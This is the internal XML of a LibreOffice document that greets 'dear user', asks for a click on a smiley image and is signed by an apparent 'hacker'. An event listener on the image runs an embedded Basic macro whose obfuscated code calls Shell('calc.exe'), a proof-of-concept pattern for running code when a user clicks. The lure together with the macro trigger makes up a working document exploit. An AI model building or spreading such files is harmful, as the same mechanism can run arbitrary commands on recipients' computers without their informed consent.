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20100000176000001442CAA1F08E2704963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d21c" officeooo:paragraph-rsid="0004d21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ello dear user,</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><draw:frame draw:style-name="fr1" draw:name="Image1" text:anchor-type="char" svg:width="3.4in" svg:height="2.9453in" draw:z-index="0"><draw:image xlink:href="Pictures/1000020100000176000001442CAA1F08E2704963.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" loext:mime-type="image/png"/><office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:select" xlink:href="vnd.sun.star.script:Standard.test.Main?language=Basic&amp;location=document" xlink:type="simple"/></office:event-listeners></draw:frame>Click the smiley</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Just one little click…</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">- hacke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11T21:44:45.657212615</meta:creation-date>
    <meta:editing-duration>PT6M30S</meta:editing-duration>
    <meta:editing-cycles>2</meta:editing-cycles>
    <meta:generator>LibreOffice/6.4.3.2$MacOSX_X86_64 LibreOffice_project/747b5d0ebf89f41c860ec2a39efd7cb15b54f2d8</meta:generator>
    <dc:date>2020-08-11T21:47:51.792808813</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="1" meta:object-count="0" meta:page-count="1" meta:paragraph-count="4" meta:word-count="12" meta:character-count="62" meta:non-whitespace-character-count="54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Sub Main
  If WsGQFM Or 2 Then
    tBFjh = "TI"
  End If
  Shell("calc.exe"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